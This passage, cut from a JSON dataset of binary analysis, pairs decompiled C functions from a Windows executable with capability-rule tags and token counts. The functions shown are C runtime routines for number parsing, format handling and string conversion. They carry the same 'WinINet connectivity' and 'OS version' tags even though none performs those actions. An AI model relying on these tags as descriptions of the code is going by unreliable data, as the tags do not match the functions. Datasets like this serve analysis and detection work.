fcn.0040211c(uVar12, 8);\n        if (iVar5 == 0) break;\n        puVar8 = *arg_ch;\n        uVar12 = *puVar8;\n    }\n    piVar10 = arg_10h + 0xc2;\n    *piVar10 = var_8h == 0x2d;\n    if ((var_8h == 0x2d) || (var_8h == 0x2b)) {\n        var_8h._0_2_ = **arg_ch;\n        var_8h = var_8h & 0xffff0000 | var_8h;\n        *arg_ch = *arg_ch + 1;\n    }\n    if ((var_8h == 0x49) || (var_8h == 0x69)) {\n        uVar6 = fcn.00405a29(&var_8h, arg_ch, puVar11);\n        return uVar6;\n    }\n    if ((var_8h == 0x4e) || (var_8h == 0x6e)) {\n        uVar6 = fcn.00404ffc(&var_8h, arg_ch, puVar11);\n        return uVar6;\n    }\n    var_ch = 0;\n    var_1h._0_1_ = 0;\n    var_14h = puVar11;\n    if (var_8h == 0x30) {\n        var_14h = *arg_ch;\n        uVar6 = *var_14h;\n        *arg_ch = var_14h + 1;\n        if ((uVar6 == 0x78) || (uVar6 == 0x58)) {\n            var_8h._0_2_ = var_14h[1];\n            var_1h._0_1_ = 1;\n            var_8h = var_8h & 0xffff0000 | var_8h;\n            *arg_ch = var_14h + 2;\n        }\n        else {\n            fcn.00402ecd(uVar6);\n            var_14h = puVar11;\n        }\n    }\n    var_10h = arg_10h + 2;\n    var_18h = 0;\n    var_2h = '\\0';\n    if (var_8h == 0x30) {\n        var_2h = '\\x01';\n        do {\n            var_8h._0_2_ = **arg_ch;\n            var_8h = var_8h & 0xffff0000 | var_8h;\n            *arg_ch = *arg_ch + 1;\n        } while (var_8h == 0x30);\n    }\n    uVar6 = ((var_1h == 0) - 1 & 6) + 9;\n    do {\n        if (var_8h < 0x30) goto code_r0x004b3286;\n        if (var_8h < 0x3a) {\n            uVar7 = var_8h - 0x30;\ncode_r0x004b3281:\n            if (uVar7 == 0xffffffff) goto code_r0x004b3286;\n        }\n        else {\n            if (0xff0f < var_8h) {\n                if (var_8h < 0xff1a) {\n                    uVar7 = var_8h - 0xff10;\n                }\n                else {\n                    uVar7 = 0xffffffff;\n                }\n                goto code_r0x004b3281;\n            }\n            if (0x65f < var_8h) {\n                if (var_8h < 0x66a) {\n                    uVar7 = var_8h - 0x660;\n                }\n                else {\n                    if (var_8h < 0x6f0) goto code_r0x004b3286;\n                    if (var_8h < 0x6fa) {\n                        uVar7 = var_8h - 0x6f0;\n                    }\n                    else {\n                        if (var_8h < 0x966) goto code_r0x004b3286;\n                        if (var_8h < 0x970) {\n                            uVar7 = var_8h - 0x966;\n                        }\n                        else {\n                            if (var_8h < 0x9e6) goto code_r0x004b3286;\n                            if (var_8h < 0x9f0) {\n                                uVar7 = var_8h - 0x9e6;\n                            }\n                            else {\n                                if (var_8h < 0xa66) goto code_r0x004b3286;\n                                if (var_8h < 0xa70) {\n                                    uVar7 = var_8h - 0xa66;\n                                }\n                                else {\n                                    if (var_8h < 0xae6) goto code_r0x004b3286;\n                                    if (var_8h < 0xaf0) {\n                                        uVar7 = var_8h - 0xae6;\n                                    }\n                                    else {\n                                        if (var_8h < 0xb66) goto code_r0x004b3286;\n                                        if (var_8h < 0xb70) {\n                                            uVar7 = var_8h - 0xb66;\n                                        }\n                                        else {\n                                            if (var_8h < 0xc66) goto code_r0x004b3286;\n                                            if (var_8h < 0xc70) {\n                                                uVar7 = var_8h - 0xc66;\n                                            }\n                                            else {\n                                                if (var_8h < 0xce6) goto code_r0x004b3286;\n                                                if (var_8h < 0xcf0) {\n                                                    uVar7 = var_8h - 0xce6;\n                                                }\n                                                else {\n                                                    if (var_8h < 0xd66) goto code_r0x004b3286;\n                                                    if (var_8h < 0xd70) {\n                                                        uVar7 = var_8h - 0xd66;\n                                                    }\n                                                    else {\n                                                        if (var_8h < 0xe50) goto code_r0x004b3286;\n                                                        if (var_8h < 0xe5a) {\n                                                            uVar7 = var_8h - 0xe50;\n                                                        }\n                                                        else {\n                                                            if (var_8h < 0xed0) goto code_r0x004b3286;\n                                                            if (var_8h < 0xeda) {\n                                                                uVar7 = var_8h - 0xed0;\n                                                            }\n                                                            else {\n                                                                if (var_8h < 0xf20) goto code_r0x004b3286;\n                                                                if (var_8h < 0xf2a) {\n                                                                    uVar7 = var_8h - 0xf20;\n                                                                }\n                                                                else {\n                                                                    if (var_8h < 0x1040) goto code_r0x004b3286;\n                                                                    if (var_8h < 0x104a) {\n                                                                        uVar7 = var_8h - 0x1040;\n                                                                    }\n                                                                    else {\n                                                                        if (var_8h < 0x17e0) goto code_r0x004b3286;\n                                                                        if (var_8h < 0x17ea) {\n                                                                            uVar7 = var_8h - 0x17e0;\n                                                                        }\n                                                                        else {\n                                                                            if ((var_8h < 0x1810) || (0x1819 < var_8h))\n                                                                            goto code_r0x004b3286;\n                                                                            uVar7 = var_8h - 0x1810;\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                goto code_r0x004b3281;\n            }\ncode_r0x004b3286:\n            uVar7 = var_8h;\n            if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                uVar7 = 0xffffffff;\n            }\n            else {\n                if (uVar7 - 0x61 < 0x1a) {\n                    uVar7 = uVar7 - 0x20;\n                }\n                uVar7 = uVar7 - 0x37;\n            }\n        }\n        if (uVar6 < uVar7) goto code_r0x004b32d8;\n        var_2h = '\\x01';\n        if (var_10h != piVar10) {\n            *var_10h = uVar7;\n            var_10h = var_10h + 1;\n        }\n        var_18h = var_18h + 1;\n        var_8h._0_2_ = **arg_ch;\n        var_8h = var_8h & 0xffff0000 | var_8h;\n        *arg_ch = *arg_ch + 1;\n    } while( true );\ncode_r0x004b3883:\n    var_ch = 0x1451;\ncode_r0x004b3890:\n    do {\n        uVar9 = uVar7;\n        if (uVar9 < 0x30) goto code_r0x004b3ae1;\n        if (uVar9 < 0x3a) {\n            uVar6 = uVar7 - 0x30;\ncode_r0x004b3adc:\n            if (uVar6 == 0xffffffff) goto code_r0x004b3ae1;\n        }\n        else {\n            if (0xff0f < uVar9) {\n                if (uVar9 < 0xff1a) {\n                    uVar6 = uVar7 - 0xff10;\n                }\n                else {\n                    uVar6 = 0xffffffff;\n                }\n                goto code_r0x004b3adc;\n            }\n            if (0x65f < uVar9) {\n                if (uVar9 < 0x66a) {\n                    uVar6 = uVar7 - 0x660;\n                }\n                else {\n                    if (uVar9 < 0x6f0) goto code_r0x004b3ae1;\n                    if (uVar9 < 0x6fa) {\n                        uVar6 = uVar7 - 0x6f0;\n                    }\n                    else {\n                        if (uVar9 < 0x966) goto code_r0x004b3ae1;\n                        if (uVar9 < 0x970) {\n                            uVar6 = uVar7 - 0x966;\n                        }\n                        else {\n                            if (uVar9 < 0x9e6) goto code_r0x004b3ae1;\n                            if (uVar9 < 0x9f0) {\n                                uVar6 = uVar7 - 0x9e6;\n                            }\n                            else {\n                                if (uVar9 < 0xa66) goto code_r0x004b3ae1;\n                                if (uVar9 < 0xa70) {\n                                    uVar6 = uVar7 - 0xa66;\n                                }\n                                else {\n                                    if (uVar9 < 0xae6) goto code_r0x004b3ae1;\n                                    if (uVar9 < 0xaf0) {\n                                        uVar6 = uVar7 - 0xae6;\n                                    }\n                                    else {\n                                        if (uVar9 < 0xb66) goto code_r0x004b3ae1;\n                                        if (uVar9 < 0xb70) {\n                                            uVar6 = uVar7 - 0xb66;\n                                        }\n                                        else {\n                                            if (uVar9 < 0xc66) goto code_r0x004b3ae1;\n                                            if (uVar9 < 0xc70) {\n                                                uVar6 = uVar7 - 0xc66;\n                                            }\n                                            else {\n                                                if (uVar9 < 0xce6) goto code_r0x004b3ae1;\n                                                if (uVar9 < 0xcf0) {\n                                                    uVar6 = uVar7 - 0xce6;\n                                                }\n                                                else {\n                                                    if (uVar9 < 0xd66) goto code_r0x004b3ae1;\n                                                    if (uVar9 < 0xd70) {\n                                                        uVar6 = uVar7 - 0xd66;\n                                                    }\n                                                    else {\n                                                        if (uVar9 < 0xe50) goto code_r0x004b3ae1;\n                                                        if (uVar9 < 0xe5a) {\n                                                            uVar6 = uVar7 - 0xe50;\n                                                        }\n                                                        else {\n                                                            if (uVar9 < 0xed0) goto code_r0x004b3ae1;\n                                                            if (uVar9 < 0xeda) {\n                                                                uVar6 = uVar7 - 0xed0;\n                                                            }\n                                                            else {\n                                                                if (uVar9 < 0xf20) goto code_r0x004b3ae1;\n                                                                if (uVar9 < 0xf2a) {\n                                                                    uVar6 = uVar7 - 0xf20;\n                                                                }\n                                                                else {\n                                                                    if (uVar9 < 0x1040) goto code_r0x004b3ae1;\n                                                                    if (uVar9 < 0x104a) {\n                                                                        uVar6 = uVar7 - 0x1040;\n                                                                    }\n                                                                    else {\n                                                                        if (uVar9 < 0x17e0) goto code_r0x004b3ae1;\n                                                                        if (uVar9 < 0x17ea) {\n                                                                            uVar6 = uVar7 - 0x17e0;\n                                                                        }\n                                                                        else {\n                                                                            if ((uVar9 < 0x1810) || (0x1819 < uVar9))\n                                                                            goto code_r0x004b3ae1;\n                                                                            uVar6 = uVar7 - 0x1810;\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                goto code_r0x004b3adc;\n            }\ncode_r0x004b3ae1:\n            if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                uVar6 = 0xffffffff;\n            }\n            else {\n                if (uVar7 - 0x61 < 0x1a) {\n                    uVar7 = uVar7 - 0x20;\n                }\n                uVar6 = uVar7 - 0x37;\n            }\n        }\n        if (9 < uVar6) break;\n        uVar9 = **arg_ch;\n        uVar7 = uVar9;\n        var_8h = var_8h & 0xffff0000 | uVar9;\n        *arg_ch = *arg_ch + 1;\n    } while( true );\n    if (uVar12 == 0x2d) {\n        var_ch = -var_ch;\n    }\n    iVar5 = var_ch;\n    if (!bVar1) {\n        fcn.00402ecd(var_8h);\n        *arg_ch = puVar11;\n        var_8h = var_8h & 0xffff0000 | *puVar11;\n        *arg_ch = puVar8;\n    }\n    goto code_r0x004b3b59;\ncode_r0x004b32d8:\n    if (var_8h == ***(*arg_8h + 0x88)) {\n        puVar11 = *arg_ch + 1;\n        uVar12 = **arg_ch;\n        var_8h = var_8h & 0xffff0000 | uVar12;\n        *arg_ch = puVar11;\n        if ((var_10h == arg_10h + 2) && (uVar12 == 0x30)) {\n            var_2h = '\\x01';\n            do {\n                uVar12 = *puVar11;\n                var_18h = var_18h + -1;\n                puVar11 = puVar11 + 1;\n                var_8h = var_8h & 0xffff0000 | uVar12;\n                *arg_ch = puVar11;\n            } while (uVar12 == 0x30);\n        }\n        do {\n            iVar5 = 0x30;\n            if (uVar12 < 0x30) {\ncode_r0x004b34e7:\n                uVar7 = uVar12;\n                if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                    uVar7 = 0xffffffff;\n                }\n                else {\n                    if (uVar7 - 0x61 < 0x1a) {\n                        uVar7 = uVar7 - 0x20;\n                    }\n                    uVar7 = uVar7 - 0x37;\n                }\n            }\n            else {\n                if (uVar12 < 0x3a) {\ncode_r0x004b336c:\n                    uVar7 = uVar12 - iVar5;\n                }\n                else {\n                    iVar5 = 0xff10;\n                    if (uVar12 < 0xff10) {\n                        iVar5 = 0x660;\n                        if ((uVar12 < 0x660) ||\n                           ((0x669 < uVar12 &&\n                            ((iVar5 = 0x6f0,  uVar12 < 0x6f0 ||\n                             ((0x6f9 < uVar12 &&\n                              ((iVar5 = 0x966,  uVar12 < 0x966 ||\n                               ((0x96f < uVar12 &&\n                                ((iVar5 = 0x9e6,  uVar12 < 0x9e6 ||\n                                 ((0x9ef < uVar12 &&\n                                  ((iVar5 = 0xa66,  uVar12 < 0xa66 ||\n                                   ((0xa6f < uVar12 &&\n                                    ((iVar5 = 0xae6,  uVar12 < 0xae6 ||\n                                     ((0xaef < uVar12 &&\n                                      ((iVar5 = 0xb66,  uVar12 < 0xb66 ||\n                                       ((0xb6f < uVar12 &&\n                                        ((iVar5 = 0xc66,  uVar12 < 0xc66 ||\n                                         ((0xc6f < uVar12 &&\n                                          ((iVar5 = 0xce6,  uVar12 < 0xce6 ||\n                                           ((0xcef < uVar12 &&\n                                            ((iVar5 = 0xd66,  uVar12 < 0xd66 ||\n                                             ((0xd6f < uVar12 &&\n                                              ((iVar5 = 0xe50,  uVar12 < 0xe50 ||\n                                               ((0xe59 < uVar12 &&\n                                                ((iVar5 = 0xed0,  uVar12 < 0xed0 ||\n                                                 ((0xed9 < uVar12 &&\n                                                  ((iVar5 = 0xf20,  uVar12 < 0xf20 ||\n                                                   ((0xf29 < uVar12 &&\n                                                    ((iVar5 = 0x1040,  uVar12 < 0x1040 ||\n                                                     ((0x1049 < uVar12 &&\n                                                      ((iVar5 = 0x17e0,  uVar12 < 0x17e0 ||\n                                                       ((0x17e9 < uVar12 &&\n                                                        ((iVar5 = 0x1810,  uVar12 < 0x1810 || (0x1819 < uVar12))))))))))\n                                                    ))))))))))))))))))))))))))))))))))))))))))))))))))))\n                        goto code_r0x004b34e7;\n                        goto code_r0x004b336c;\n                    }\n                    if (uVar12 < 0xff1a) goto code_r0x004b336c;\n                    uVar7 = 0xffffffff;\n                }\n                if (uVar7 == 0xffffffff) goto code_r0x004b34e7;\n            }\n            if (uVar6 < uVar7) break;\n            var_2h = '\\x01';\n            if (var_10h != piVar10) {\n                *var_10h = uVar7;\n                var_10h = var_10h + 1;\n            }\n            uVar12 = **arg_ch;\n            *arg_ch = *arg_ch + 1;\n            var_8h = var_8h & 0xffff0000 | uVar12;\n        } while( true );\n    }\n    fcn.00402ecd(var_8h);\n    if (var_2h == '\\0') {\n        *arg_ch = var_14h;\n        if (var_1h != 0) {\n            return 2;\n        }\n        return 7;\n    }\n    puVar11 = *arg_ch;\n    uVar12 = *puVar11;\n    puVar8 = puVar11 + 1;\n    uVar6 = var_8h & 0xffff0000;\n    var_8h = uVar6 | uVar12;\n    *arg_ch = puVar8;\n    if (uVar12 == 0x45) {\ncode_r0x004b359e:\n        uVar4 = var_1h ^ 1;\n    }\n    else if (uVar12 == 0x50) {\ncode_r0x004b3599:\n        uVar4 = var_1h;\n    }\n    else {\n        if (uVar12 == 0x65) goto code_r0x004b359e;\n        uVar4 = 0;\n        if (uVar12 == 0x70) goto code_r0x004b3599;\n    }\n    iVar5 = 0;\n    if (uVar4 != 0) {\n        uVar12 = *puVar8;\n        *arg_ch = puVar11 + 2;\n        if ((uVar12 == 0x2b) || (uVar9 = uVar12,  uVar12 == 0x2d)) {\n            uVar9 = puVar11[2];\n            *arg_ch = puVar11 + 3;\n        }\n        var_8h = uVar6 | uVar9;\n        bVar2 = false;\n        if (uVar9 == 0x30) {\n            bVar2 = true;\n            do {\n                uVar9 = **arg_ch;\n                var_8h = var_8h & 0xffff0000 | uVar9;\n                *arg_ch = *arg_ch + 1;\n            } while (uVar9 == 0x30);\n        }\n        do {\n            uVar7 = uVar9;\n            uVar6 = uVar9;\n            if (uVar9 < 0x30) goto code_r0x004b3827;\n            if (uVar9 < 0x3a) {\n                uVar6 = uVar6 - 0x30;\ncode_r0x004b3822:\n                if (uVar6 == 0xffffffff) goto code_r0x004b3827;\n            }\n            else {\n                if (0xff0f < uVar9) {\n                    if (uVar9 < 0xff1a) {\n                        uVar6 = uVar6 - 0xff10;\n                    }\n                    else {\n                        uVar6 = 0xffffffff;\n                    }\n                    goto code_r0x004b3822;\n                }\n                if (0x65f < uVar9) {\n                    if (uVar9 < 0x66a) {\n                        uVar6 = uVar6 - 0x660;\n                    }\n                    else {\n                        if (uVar9 < 0x6f0) goto code_r0x004b3827;\n                        if (uVar9 < 0x6fa) {\n                            uVar6 = uVar6 - 0x6f0;\n                        }\n                        else {\n                            if (uVar9 < 0x966) goto code_r0x004b3827;\n                            if (uVar9 < 0x970) {\n                                uVar6 = uVar6 - 0x966;\n                            }\n                            else {\n                                if (uVar9 < 0x9e6) goto code_r0x004b3827;\n                                if (uVar9 < 0x9f0) {\n                                    uVar6 = uVar6 - 0x9e6;\n                                }\n                                else {\n                                    if (uVar9 < 0xa66) goto code_r0x004b3827;\n                                    if (uVar9 < 0xa70) {\n                                        uVar6 = uVar6 - 0xa66;\n                                    }\n                                    else {\n                                        if (uVar9 < 0xae6) goto code_r0x004b3827;\n                                        if (uVar9 < 0xaf0) {\n                                            uVar6 = uVar6 - 0xae6;\n                                        }\n                                        else {\n                                            if (uVar9 < 0xb66) goto code_r0x004b3827;\n                                            if (uVar9 < 0xb70) {\n                                                uVar6 = uVar6 - 0xb66;\n                                            }\n                                            else {\n                                                if (uVar9 < 0xc66) goto code_r0x004b3827;\n                                                if (uVar9 < 0xc70) {\n                                                    uVar6 = uVar6 - 0xc66;\n                                                }\n                                                else {\n                                                    if (uVar9 < 0xce6) goto code_r0x004b3827;\n                                                    if (uVar9 < 0xcf0) {\n                                                        uVar6 = uVar6 - 0xce6;\n                                                    }\n                                                    else {\n                                                        if (uVar9 < 0xd66) goto code_r0x004b3827;\n                                                        if (uVar9 < 0xd70) {\n                                                            uVar6 = uVar6 - 0xd66;\n                                                        }\n                                                        else {\n                                                            if (uVar9 < 0xe50) goto code_r0x004b3827;\n                                                            if (uVar9 < 0xe5a) {\n                                                                uVar6 = uVar6 - 0xe50;\n                                                            }\n                                                            else {\n                                                                if (uVar9 < 0xed0) goto code_r0x004b3827;\n                                                                if (uVar9 < 0xeda) {\n                                                                    uVar6 = uVar6 - 0xed0;\n                                                                }\n                                                                else {\n                                                                    if (uVar9 < 0xf20) goto code_r0x004b3827;\n                                                                    if (uVar9 < 0xf2a) {\n                                                                        uVar6 = uVar6 - 0xf20;\n                                                                    }\n                                                                    else {\n                                                                        if (uVar9 < 0x1040) goto code_r0x004b3827;\n                                                                        if (uVar9 < 0x104a) {\n                                                                            uVar6 = uVar6 - 0x1040;\n                                                                        }\n                                                                        else {\n                                                                            if (uVar9 < 0x17e0) goto code_r0x004b3827;\n                                                                            if (uVar9 < 0x17ea) {\n                                                                                uVar6 = uVar6 - 0x17e0;\n                                                                            }\n                                                                            else {\n                                                                                if ((uVar9 < 0x1810) || (0x1819 < uVar9)\n                                                                                   ) goto code_r0x004b3827;\n                                                                                uVar6 = uVar6 - 0x1810;\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    goto code_r0x004b3822;\n                }\ncode_r0x004b3827:\n                if (((uVar7 < 0x41) || (0x5a < uVar7)) && (0x19 < uVar7 - 0x61)) {\n                    uVar6 = 0xffffffff;\n                }\n                else {\n                    uVar6 = uVar7;\n                    if (uVar7 - 0x61 < 0x1a) {\n                        uVar6 = uVar7 - 0x20;\n                    }\n                    uVar6 = uVar6 - 0x37;\n                }\n            }\n            bVar1 = bVar2;\n            if (9 < uVar6) goto code_r0x004b3890;\n            bVar2 = true;\n            bVar1 = true;\n            var_ch = var_ch * 10 + uVar6;\n            if (0x1450 < var_ch) goto code_r0x004b3883;\n            uVar9 = **arg_ch;\n            *arg_ch = *arg_ch + 1;\n            var_8h = var_8h & 0xffff0000 | uVar9;\n        } while( true );\n    }\ncode_r0x004b3b59:\n    fcn.00402ecd(var_8h);\n    piVar10 = arg_10h + 2;\n    if (var_10h != piVar10) {\n        do {\n            if (*(var_10h + -1) != '\\0') break;\n            var_10h = var_10h + -1;\n        } while (var_10h != piVar10);\n        if (var_10h != piVar10) {\n            if (0x1450 < iVar5) {\n                return 9;\n            }\n            if (-0x1451 < iVar5) {\n                iVar5 = iVar5 + (((var_1h == 0) - 1 & 3) + 1) * var_18h;\n                if (0x1450 < iVar5) {\n                    return 9;\n                }\n                if (-0x1451 < iVar5) {\n                    *arg_10h = iVar5;\n                    arg_10h[1] = var_10h - piVar10;\n                    return var_1h;\n                }\n            }\n            return 8;\n        }\n    }\n    return 2;\n}\n",
        "token_count": 7229
    },
    "004024cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004024cd(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t arg_ch_00;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *puVar6;\n    uint var_3ch;\n    uint var_10h;\n    uint var_4h;\n    int32_t iVar4;\n    \n    fcn.004030e9(0x30);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    puVar2 = fcn.004026d5(unaff_EBP + -0x3c);\n    puVar6 = extraout_ECX + 0x2c;\n    for (iVar5 = 0xb; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    arg_ch_00 = fcn.00401366();\n    iVar5 = *(unaff_EBP + -0x10);\n    *(unaff_EBP + -0x10) = iVar5;\n    *(iVar5 + 8) = 0;\n    *(iVar5 + 0x10) = 0;\n    *(iVar5 + 0x14) = 0;\n    *(iVar5 + 0x18) = 0;\n    uVar3 = *(arg_ch_00 + 0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = fcn.00401c8f(uVar3);\n    *(iVar5 + 8) = uVar3;\n    fcn.0040197e(0, arg_ch_00);\n    if (*(iVar5 + 0x28) == '\\0') {\n        cVar1 = *(arg_ch_00 + 0x29);\n    }\n    else {\n        cVar1 = *(arg_ch_00 + 0x28);\n    }\n    iVar4 = cVar1;\n    *(iVar5 + 0x1c) = iVar4;\n    if ((iVar4 < 0) || (0x7e < iVar4)) {\n        *(iVar5 + 0x1c) = 0;\n    }\n    fcn.0040313e(iVar5 + 0x20, *(arg_ch_00 + 0x2b), *(arg_ch_00 + 0x2a), *(arg_ch_00 + 0x2e));\n    fcn.0040313e(iVar5 + 0x24, *(arg_ch_00 + 0x2d), *(arg_ch_00 + 0x2c), *(arg_ch_00 + 0x2f));\n    if (*(unaff_EBP + 0xc) != '\\0') {\n        *(iVar5 + 0x20) = 0x76782b24;\n        *(iVar5 + 0x24) = 0x76782b24;\n    }\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 741
    },
    "00402504": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402504(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t arg_10h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    char cVar6;\n    char cVar7;\n    uint var_1h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_10h_00 = in_EAX & 0xffffff00 | uVar1;\n    cVar2 = arg_10h;\n    if ((uVar1 == 0x70) || (cVar2 == 'p')) {\n        return (uVar1 == 0x70) != (cVar2 != 'p');\n    }\n    cVar3 = '\\0';\n    if ((uVar1 == 0x73) || (var_1h._0_1_ = '\\0',  uVar1 == 0x53)) {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((cVar2 == 's') || (cVar7 = cVar3,  cVar2 == 'S')) {\n        cVar7 = '\\x01';\n    }\n    if ((uVar1 == 99) || (cVar6 = cVar3,  uVar1 == 0x43)) {\n        cVar6 = '\\x01';\n    }\n    if ((cVar2 == 'c') || (cVar2 == 'C')) {\n        cVar3 = '\\x01';\n    }\n    if (var_1h == '\\0') {\n        if (cVar7 != '\\0') {\n            return false;\n        }\n        if (cVar6 == '\\0') {\n            if (cVar3 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.00404589(arg_10h_00);\n            cVar3 = fcn.00404589(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar4 = fcn.00402739(arg_8h[3]);\n            iVar5 = fcn.00402739(arg_14h);\n            return iVar4 == iVar5;\n        }\n    }\n    else if (var_1h != cVar7) {\n        return false;\n    }\n    if (cVar6 == cVar3) {\n        cVar2 = fcn.00404737(*in_ECX, in_ECX[1], arg_10h_00, arg_8h[3]);\n        cVar3 = fcn.00404737(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 762
    },
    "004025db": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004025db(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 83
    },
    "0040263a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl fcn.0040263a(uint *arg_8h, uint16_t **arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint *puVar4;\n    uint16_t *puVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint16_t *var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    puVar5 = *arg_ch;\n    puVar4 = arg_8h;\n    puVar2 = puVar5;\n    if (arg_8h == NULL) {\n        while ((iVar3 = fcn.00406677(&var_ch, *puVar5, arg_14h),  iVar3 != -1 &&\n               ((iVar3 == 0 || (*(&var_10h + iVar3 + 3) != '\\0'))))) {\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        while( true ) {\n            var_10h = puVar2;\n            arg_8h_00 = puVar4;\n            if (arg_10h < 4) {\n                arg_8h_00 = &var_ch;\n            }\n            uVar1 = fcn.00406677(arg_8h_00, *puVar5, arg_14h);\n            if (uVar1 == 0xffffffff) {\n                *arg_ch = var_10h;\n                goto code_r0x004dc478;\n            }\n            if (arg_8h_00 != puVar4) {\n                puVar2 = var_10h;\n                if (arg_10h < uVar1) goto code_r0x004dc430;\n                fcn.0040576d(puVar4, arg_8h_00, uVar1);\n            }\n            if ((uVar1 != 0) && (*(puVar4 + (uVar1 - 1)) == '\\0')) break;\n            puVar5 = puVar5 + 1;\n            if (uVar1 != 0) {\n                var_10h = puVar5;\n            }\n            arg_10h = arg_10h - uVar1;\n            puVar4 = puVar4 + uVar1;\n            puVar2 = var_10h;\n        }\n        puVar2 = NULL;\ncode_r0x004dc430:\n        *arg_ch = puVar2;\n    }\ncode_r0x004dc478:\n    fcn.00403085(arg_8h);\n    return;\n}\n",
        "token_count": 639
    },
    "00402658": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402658(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 332
    },
    "0040267b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
